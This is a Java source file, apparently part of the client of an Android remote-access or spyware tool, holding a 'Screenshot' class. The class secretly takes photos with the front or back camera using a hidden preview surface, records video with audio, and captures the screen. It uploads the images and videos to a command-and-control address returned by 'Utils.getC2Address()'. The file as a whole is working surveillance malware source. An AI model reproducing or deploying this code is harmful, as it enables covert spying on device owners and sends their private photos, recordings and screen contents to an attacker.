package com.ot.grhq.client.functionality;

import android.app.Activity;
import android.app.Notification;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.ImageFormat;
import android.graphics.Paint;
import android.os.Environment;
import android.os.RemoteException;
import android.view.Gravity;
import android.graphics.PixelFormat;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.hardware.camera2.CameraManager;
import android.hardware.display.DisplayManager;
import android.media.AudioManager;
import android.media.CamcorderProfile;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.Surface;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.view.WindowManager;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.nio.ByteBuffer;

public class Screenshot {

    private static MediaProjection mediaProjection;
    private static ImageReader imageReader;

    private static boolean isRecording = false;

    private static MediaRecorder mediaRecorder;
    private static SurfaceTexture surfaceTexture;
    private static Surface surface;


    private static android.hardware.Camera camera;


    /**
     *
     * @return
     */
    public static String captureImage(Context context, boolean frontCamera) {
        String filename =  Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).toString() + "/"+ String.valueOf(System.currentTimeMillis()).replaceAll(":", ".") + ".png";
        File img = new File(filename);
        try {
            if (!img.exists())
                img.createNewFile();
        } catch (Exception ex) {
            Log.e("eeee", ex.toString());
        }

        camera = getCamera(frontCamera);
        android.hardware.Camera.Parameters parameters = camera.getParameters();
        camera.setParameters(parameters);
        try{
            camera.setPreviewTexture(new SurfaceTexture(0));
            camera.startPreview();
        } catch (Exception e) {
            e.printStackTrace();
        }

        camera.takePicture(null, null, new android.hardware.Camera.PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, android.hardware.Camera camera) {
                releaseCamera();
                try{
                    Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
                    FileOutputStream output = new FileOutputStream(img);
                    bitmap.compress(Bitmap.CompressFormat.PNG, 20, output);

                    output.flush();
                    output.close();
                    FileManager.uploadFile(img.getAbsolutePath(), Utils.getC2Address() + "/image");
                }catch(Exception ex){
                }
            }
        });

        return img.getAbsolutePath();
    }

    /**
     * Camera cleanup
     */
    private static void releaseCamera(){
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }

    /**
     * Take screenshot of device
     * @return
     */
    public static String captureScreen() {
        try {
            String filename =  Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).toString() + "/"+ String.valueOf(System.currentTimeMillis()).replaceAll(":", ".") + ".png";
            Process process = Runtime.getRuntime().exec("screencap " + filename);
            process.waitFor();
            Thread.sleep(3000);

            if (process.exitValue() == 0)
                return filename;
        } catch (Exception exception) {
            Log.e("eeee", exception.toString());
        }

        return null;
//        if (mediaProjectionManager != null)
//            activity.startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), REQUEST_CODE_SCREEN_CAPTURE);

    }

    public static String takeScreenshot(MediaProjection mProjection, Activity activity) {
        String filename =  Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).toString() + "/"+ String.valueOf(System.currentTimeMillis()).replaceAll(":", ".") + ".png";

        DisplayMetrics metrics = activity.getResources().getDisplayMetrics();
        int width = metrics.widthPixels;
        int height = metrics.heightPixels;
        ImageReader mImageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        mProjection.createVirtualDisplay("ScreenCapture",
                width, height, metrics.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mImageReader.getSurface(), null, null);

        Image image = mImageReader.acquireLatestImage();
        if (image != null) {
            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
            byte[] bytes = new byte[buffer.remaining()];
            buffer.get(bytes);
            FileOutputStream fos = null;
            try {
                File file = new File(filename); // Change to your desired file location
                fos = new FileOutputStream(file);
                fos.write(bytes);
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                if (fos != null) {
                    try {
                        fos.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
            image.close();
        }
        return filename;
    }

    /**
     *
     * @param duration
     * @return
     */
    public static String captureVideo(boolean frontCamera, int duration) throws IOException, InterruptedException {
        File outputDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES);
        File videoFile = File.createTempFile(String.valueOf(System.currentTimeMillis()), ".mp4", outputDir);

        if (!isRecording) {
            startRecording(frontCamera, videoFile.getAbsolutePath());

            // Stop recording after duration
            Thread.sleep(duration * 1000L);
            stopRecording();
            FileManager.uploadFile(videoFile.getAbsolutePath(), Utils.getC2Address() + "/video");
        }

        return videoFile.getAbsolutePath();
    }

    private static void startRecording(boolean frontCamera, String filePath) throws IOException {
        surfaceTexture = new SurfaceTexture(0);
        surface = new Surface(surfaceTexture);

        Camera camera = frontCamera ? Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT) : Camera.open(Camera.CameraInfo.CAMERA_FACING_BACK);
        camera.unlock();
        mediaRecorder = new MediaRecorder();
        mediaRecorder.setCamera(camera);
        mediaRecorder.setPreviewDisplay(surface);
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        mediaRecorder.setOutputFile(filePath);
        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.MPEG_4_SP);
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
        mediaRecorder.setVideoFrameRate(30); // 30 fps
        mediaRecorder.setVideoSize(1280, 720); // 720p

        // Prepare and start recording
        try {
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
        } catch (Exception e) {
            Log.e("eeee", e.toString());
        }
    }

    private static void stopRecording() {
        if (isRecording) {
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
            isRecording = false;

            surfaceTexture = null;
            surface = null;
        }
    }


    /**
     * Select the camera to use
     * @param frontCamera
     * @return selected camera object
     */
    public static android.hardware.Camera getCamera(boolean frontCamera) {
        int numberOfCameras = android.hardware.Camera.getNumberOfCameras();

        // Search for selected camera
        for (int i = 0; i < numberOfCameras; i++) {
            android.hardware.Camera.CameraInfo info = new android.hardware.Camera.CameraInfo();
            android.hardware.Camera.getCameraInfo(i, info);
            if (info.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT && frontCamera)
                return Camera.open(i);
            else if (info.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK && !frontCamera)
                return android.hardware.Camera.open(i);
        }

        return android.hardware.Camera.open(0);
    }
}
